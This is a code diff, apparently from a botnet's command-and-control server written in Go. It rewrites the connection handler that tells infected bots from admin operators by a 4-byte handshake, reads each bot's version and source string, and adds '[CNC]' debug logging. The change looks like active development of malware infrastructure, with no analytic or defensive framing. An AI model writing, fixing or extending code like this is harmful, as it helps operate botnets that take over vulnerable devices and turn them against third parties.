@@ -50,39 +50,39 @@ func main() {
 }
 
 func initialHandler(conn net.Conn) {
-    defer conn.Close()
+	defer conn.Close()
 
-    conn.SetDeadline(time.Now().Add(10 * time.Second))
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
 
-    buf := make([]byte, 32)
-    l, err := conn.Read(buf)
-    if err != nil || l <= 0 {
-        return
-    }
+	hdr := make([]byte, 4)
+	if err := readXBytes(conn, hdr); err != nil {
+		return
+	}
 
-    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
-        if buf[3] > 0 {
-            string_len := make([]byte, 1)
-            l, err := conn.Read(string_len)
-            if err != nil || l <= 0 {
-                return
-            }
-            var source string
-            if string_len[0] > 0 {
-                source_buf := make([]byte, string_len[0])
-                l, err := conn.Read(source_buf)
-                if err != nil || l <= 0 {
-                    return
-                }
-                source = string(source_buf)
-            }
-            NewBot(conn, buf[3], source).Handle()
-        } else {
-            NewBot(conn, buf[3], "").Handle()
-        }
-    } else {
-        NewAdmin(conn).Handle()
-    }
+	fmt.Printf("[CNC] new conn, first4=%x\n", hdr)
+
+	if hdr[0] == 0x00 && hdr[1] == 0x00 && hdr[2] == 0x00 && hdr[3] == 0x01 {
+		idLenBuf := make([]byte, 1)
+		if err := readXBytes(conn, idLenBuf); err != nil {
+			return
+		}
+
+		var source string
+		if idLenBuf[0] > 0 {
+			sourceBuf := make([]byte, idLenBuf[0])
+			if err := readXBytes(conn, sourceBuf); err != nil {
+				return
+			}
+			source = string(sourceBuf)
+		}
+
+		fmt.Printf("[CNC] BOT connected. ver=%d source=%q\n", hdr[3], source)
+		NewBot(conn, hdr[3], source).Handle()
+		return
+	}
+
+	fmt.Printf("[CNC] treating as ADMIN\n")
+	NewAdmin(conn).Handle()
 }
 
 func apiHandler(conn net.Conn) {
